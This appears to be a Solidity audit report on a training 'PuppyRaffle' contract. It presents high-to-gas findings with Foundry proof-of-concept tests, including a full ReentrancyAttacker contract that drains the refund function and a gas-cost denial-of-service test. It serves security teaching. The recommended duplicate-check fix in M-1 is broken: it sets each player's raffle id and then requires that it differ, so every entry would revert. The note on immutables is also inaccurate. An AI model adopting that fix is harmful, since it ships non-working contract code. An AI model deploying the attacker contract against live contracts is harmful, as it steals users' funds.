# High Severity

### [H-1] Reentrancy attack in `PuppyRaffle::refund` function allows an attacker to steal the raffle contract balance

**Description:** The `PuppyRaffle::refund` function allows a player to withdraw their entry fee if they are not the winner. However, the `PuppyRaffle::refund` function does not set the player's balance to 0 before sending the refund (doesn't follow CEI pattern). This allows an attacker to call the `PuppyRaffle::refund` function multiple times, and drain the contract balance.

```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(
            playerAddress == msg.sender,
            "PuppyRaffle: Only the player can refund"
        );
        require(
            playerAddress != address(0),
            "PuppyRaffle: Player already refunded, or is not active"
        );

@>      payable(msg.sender).sendValue(entranceFee);

@>      players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```

A player who has entered the raffle could be a milicious contract that has a `recieve` or `fallback` function that calls the `PuppyRaffle::refund` function again. This would allow the attacker to drain the contract balance.

**Impact:** All fund paid by raffle players could be stolen by an attacker.

**Proof of Concept:**

1. User enters the raffle
2. Attacker sets up a contract with a `recieve` or `fallback` function that calls the `PuppyRaffle::refund` function
3. Attacker enters the raffle
4. Attacker calls the `PuppyRaffle::refund` function from their contract, draining the contract balance

<details>
<summary>POC code</summary>
Paste the following test into `PuppyRaffleTest.t.sol`

```javascript
function test_audit_refund_ExploitableWithReentrancy() public playersEntered {
    ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle);
    address attackUser = makeAddr("attackUser");
    vm.deal(attackUser, 1 ether);

    uint256 startingAttackerContractBalance = address(attacker).balance;
    uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;

    console2.log("Starting attacker contract balance: ", startingAttackerContractBalance);
    console2.log("Starting PuppyRaffle balance: ", startingPuppyRaffleBalance);

    // Attack
    vm.prank(attackUser);
    attacker.attack{value: entranceFee}();

    uint256 endingAttackerContractBalance = address(attacker).balance;
    uint256 endingPuppyRaffleBalance = address(puppyRaffle).balance;

    console2.log("Ending attacker contract balance: ", endingAttackerContractBalance);
    console2.log("Ending PuppyRaffle balance: ", endingPuppyRaffleBalance);

    assertEq(endingAttackerContractBalance - entranceFee, startingPuppyRaffleBalance, "Attacker contract balance should be equal to starting PuppyRaffle balance");
}
```

Add this contract as `ReentrancyAttacker.sol` in  `test/mocks`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {PuppyRaffle} from "../../src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle internal puppyRaffle;
    uint256 internal entranceFee;
    uint256 internal attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);

        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function stealMoney() internal {
        if (address(puppyRaffle).balance > 0) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    receive() external payable {
        stealMoney();
    }

    fallback() external payable {
        stealMoney();
    }
}
```

</details>

**Recommended Mitigation:**  To prevent this, set the `players` array before making the external call to `sendValue`. This will prevent the attacker from calling the `PuppyRaffle::refund` function again. This follows the Checks-Effects-Interactions pattern.

```diff
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(
        playerAddress == msg.sender,
        "PuppyRaffle: Only the player can refund"
    );
    require(
        playerAddress != address(0),
        "PuppyRaffle: Player already refunded, or is not active"
    );

-   payable(msg.sender).sendValue(entranceFee);
    
    players[playerIndex] = address(0);

+   payable(msg.sender).sendValue(entranceFee);

    emit RaffleRefunded(playerAddress);
}
```

# Medium Severity

### [M-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, increamtally increasing the gas cost of the transaction with each new player added to the array.

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramatically lower than the gas costs for players who enter right before the raffle ends. Every additional address in the `players` array, is an additional check the loop will have to make.

```javascript
@>  for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(
                players[i] != players[j],
                "PuppyRaffle: Duplicate player"
            );
        }
    }
```

**Impact:** The gas costs for raffle entrants will greatly increase as more players enter the raffle. Discouraging the later users from entering, and causing a rush at the start of a raffle to be one of the first entrants in the queue. 

An attacker might make the `players` array so big, that no one else enters, guarenteeing thenselves the win.

**Proof of Concept:**

If we have 2 sets of 100 players enter, the gas costs will be as such:
- 1st set of 100 players: 6271948 wei
- 2nd set of 100 players: 18068128 wei

This is almost a 3x increase in gas costs for the 2nd set of players.

<details>
<summary>POC code</summary>
Paste the following test into `PuppyRaffleTest.t.sol`

```javascript
    // POC `PuppyRafle::enterRaffle` DoS
    function test_audit_enterRaffle_DenialOfService() public {
        vm.txGasPrice(1);

        // Create 1st 100 players
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i; i < playersNum; i++) {
            players[i] = address(i + 1);
        }

        // Calculate gas cost of entering raffle for 1st player
        uint256 gasBefore = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasAfter = gasleft();
        uint256 gasCostFirst = (gasBefore - gasAfter) * tx.gasprice;

        // Create 2nd 100 players
        address[] memory players2 = new address[](playersNum);
        for (uint256 i; i < playersNum; i++) {
            players2[i] = address(i + 1 + playersNum);
        }

        // Calculate gas cost of entering raffle for 2nd player
        gasBefore = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players2.length}(players2);
        gasAfter = gasleft();
        uint256 gasCostSecond = (gasBefore - gasAfter) * tx.gasprice;

        console2.log(gasCostFirst);
        console2.log(gasCostSecond);

        // 2nd player should pay more gas than 1st player
        assertTrue(gasCostSecond > gasCostFirst);
    }
```
</details>

**Recommended Mitigation:** 

1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
2. Use a mapping to keep track of players who have already entered the raffle. This will allow you to check for duplicates without looping through the entire `players` array. Time complexity of a mapping lookup is O(1), while looping through an array is O(n).

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;            
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }    
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

Alternatively, you could use OpenZeppelin's [EnumerableSet](https://docs.openzeppelin.com/contracts/5.x/api/utils#EnumerableSet)

# Low Severity

### [L-1] `PuppyRaffle::getActivePlayerIndex` returns `0` for non-existent players, which is the same as the index for the first player in the `players` array, causing a player at the index `0` to incorrectly think they have not entered the raffle

**Description:** If a player is in the `PuppyRaffle::players` array at index `0`, and they call the `PuppyRaffle::getActivePlayerIndex` function with their address, the function will return `0`. But additionally natspec comments state that the function returns `0` if the player is not in the `PuppyRaffle::players` array.

```javascript
    function getActivePlayerIndex(
        address player
    ) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }

@>      return 0;
    }
```

**Impact:** A player at index `0` will incorrectly think they have not entered the raffle, and will attempt to enter the raffle again.

**Proof of Concept:**

1. User enters the raffle
2. User calls `PuppyRaffle::getActivePlayerIndex` with their address
3. User thinks they have not entered the raffle, and attempts to enter again

**Recommended Mitigation:** The easiest option would be to revert if the player is not in the array insead of returning `0`. You could also reserve the 0th position.

# Informational

### [I-1]: Solidity pragma should be specific, not wide

**Description:** Contracts should be deployed with the same compiler version and flags that they have been tested the most with. Locking the pragma helps ensure that contracts do not accidentally get deployed using, for example, the latest compiler which may have higher risks of undiscovered bugs.

**Recommended Mitigation:** 
Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol [Line: 2](https://github.com/Cyfrin/4-puppy-raffle-audit/blob/2a47715b30cf11ca82db148704e67652ad679cd8/src/PuppyRaffle.sol#L2)

	```javascript
	pragma solidity ^0.7.6;
	```

### [I-2]: Using an outdated version of Solidity is not recommended

**Description:** solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks.

**Recommended Mitigation:** Deploy with any of the following Solidity versions:
- `0.8.18`

The recommendations take into account:
- Risks related to recent releases
- Risks of complex code generation changes
- Risks of new language features
- Risks of known bugs
Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

For more information, see the [Slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity).

### [I-3]: Distinguish `immutable` variables from state variables

**Description:** Immutable variables are declared with the `immutable` keyword. They are similar to `constant` variables, but they can be assigned to at deployment time. Immutable variables are stored in the contract bytecode, and their value can be read from the contract storage. This means that they are more expensive to deploy than `constant` variables, but cheaper to read. Without a prefix, it is difficult to distinguish immutable variables from state variables.

**Recommended Mitigation:** Consider using the `i_` prefix for immutable variables, or capital letters to distinguish them from state variables.

### [I-4]: Missing checks for `address(0)` when assigning values to address state variables

**Description:** Assigning values to address state variables without checking for `address(0)`. This can lead to unexpected behavior if the address is `address(0)`.

- Found in src/PuppyRaffle.sol [Line: 62](https://github.com/Cyfrin/4-puppy-raffle-audit/blob/2a47715b30cf11ca82db148704e67652ad679cd8/src/PuppyRaffle.sol#L62)

	```javascript
	feeAddress = _feeAddress;
	```

- Found in src/PuppyRaffle.sol [Line: 150](https://github.com/Cyfrin/4-puppy-raffle-audit/blob/2a47715b30cf11ca82db148704e67652ad679cd8/src/PuppyRaffle.sol#L150)

	```javascript
	previousWinner = winner;
	```

- Found in src/PuppyRaffle.sol [Line: 168](https://github.com/Cyfrin/4-puppy-raffle-audit/blob/2a47715b30cf11ca82db148704e67652ad679cd8/src/PuppyRaffle.sol#L168)

	```javascript
	feeAddress = newFeeAddress;
	```
**Recommended Mitigation:** Consider checking for `address(0)` before assigning values to address state variables. Or add the modifier `nonZeroAddress` to the state variable declaration.

```javascript
modifier nonZeroAddress(address _address) {
    if(_address == address(0)) {
        revert ZeroAddress();
    }
    _;
}
```

### [I-5]: Missing checks for `0` when assigning values to uint state variables

**Description:** Assigning values to uint state variables without checking for `0`. This can lead to unexpected behavior if the value is `0`. 

- Found in src/PuppyRaffle.sol [Line: 61](https://github.com/Cyfrin/4-puppy-raffle-audit/blob/2a47715b30cf11ca82db148704e67652ad679cd8/src/PuppyRaffle.sol#L61)

	```javascript
	entranceFee = _entranceFee;
	```

- Found in src/PuppyRaffle.sol [Line: 63](https://github.com/Cyfrin/4-puppy-raffle-audit/blob/2a47715b30cf11ca82db148704e67652ad679cd8/src/PuppyRaffle.sol#L63)

	```javascript
	raffleDuration = _raffleDuration;
	```

**Recommended Mitigation:** Consider checking for `0` value before assigning values to uint state variables. Or add the modifier `nonZeroNumber` to the state variable declaration.

```javascript
modifier nonZeroNumber(uint256 _number) {
    if(_number == 0) {
        revert ZeroNumber();
    }
    _;
}
```

### [I-6]: Missing checks for empty array `[]` for function parameters

**Description:** Functions that take an array as a parameter should check for an empty array `[]`. This can lead to unexpected behavior if the array is empty.

- Found in src/PuppyRaffle.sol [Line: 79](https://github.com/Cyfrin/4-puppy-raffle-audit/blob/2a47715b30cf11ca82db148704e67652ad679cd8/src/PuppyRaffle.sol#L79)

	```javascript
	function enterRaffle(address[] memory newPlayers) public payable {
	```

**Recommended Mitigation:** Consider checking for empty array `[]` before assigning values to array state variables. Or add the modifier `nonEmptyArray` to the function parameter declaration.

```javascript
modifier nonEmptyArray(address[] memory _array) {
    if(_array.length == 0) {
        revert EmptyArray();
    }
    _;
}
```

# Gas Optimization

### [G-1]: Unchanged state variables should be constant or immutable

**Description:** Multiple state variables are not changed after initialization. These variables should be declared as constant or immutable to prevent accidental changes. Reading from constant or immutable variables is cheaper than reading from state variables.

Instances of this issue are:
- `PuppyRaffle::entranceFee`
- `PuppyRaffle::raffleDuration`
- `PuppyRaffle::commonImageUri`
- `PuppyRaffle::rareImageUri`
- `PuppyRaffle::legendaryImageUri`

**Recommended Mitigation:** Consider declaring these variables as constant or immutable.
- `PuppyRaffle::entranceFee` as `immutable`
- `PuppyRaffle::raffleDuration` as `immutable`
- `PuppyRaffle::commonImageUri` as `constant`
- `PuppyRaffle::rareImageUri` as `constant`
- `PuppyRaffle::legendaryImageUri` as `constant`

### [G-2]: Initializing state variables to their default value is redundant

**Description:** State variables are initialized to their default value. This is redundant and can be removed. For example, `uint64 public totalFees = 0;`

**Recommended Mitigation:** Consider removing the initialization of state variables to their default value. Update `uint64 public totalFees = 0;` to `uint64 public totalFees;`

### [G-3]: Functions not used internally could be marked external

**Description:** Functions that are not used internally could be marked external. This reduces the gas cost of the function call.

- Found in src/PuppyRaffle.sol [Line: 79](https://github.com/Cyfrin/4-puppy-raffle-audit/blob/2a47715b30cf11ca82db148704e67652ad679cd8/src/PuppyRaffle.sol#L79)

	```javascript
	function enterRaffle(address[] memory newPlayers) public payable {
	```

- Found in src/PuppyRaffle.sol [Line: 96](https://github.com/Cyfrin/4-puppy-raffle-audit/blob/2a47715b30cf11ca82db148704e67652ad679cd8/src/PuppyRaffle.sol#L96)

	```javascript
	function refund(uint256 playerIndex) public {
	```

**Recommended Mitigation:** Consider marking these functions as `external` instead of `public`.

### [G-4]: Storage variables in the loop should be cached in memory

**Description:** Every time a storage variable is accessed in a loop, it is read from the storage. This is expensive and can be avoided by caching the variable in memory.

**Recommended Mitigation:** Replace the `players.length` in the loop to a variable `playersLength` that is cached in memory before the loop.

```diff
+   uint256 playersLength = players.length;
-   for (uint256 i = 0; i < players.length - 1; i++) {
+   for (uint256 i = 0; i < playersLength - 1; i++) {
-       for (uint256 j = i + 1; j < players.length; j++) {
+       for (uint256 j = i + 1; j < playersLength; j++) {
            require(
                players[i] != players[j],
                "PuppyRaffle: Duplicate player"
            );
        }
    }
```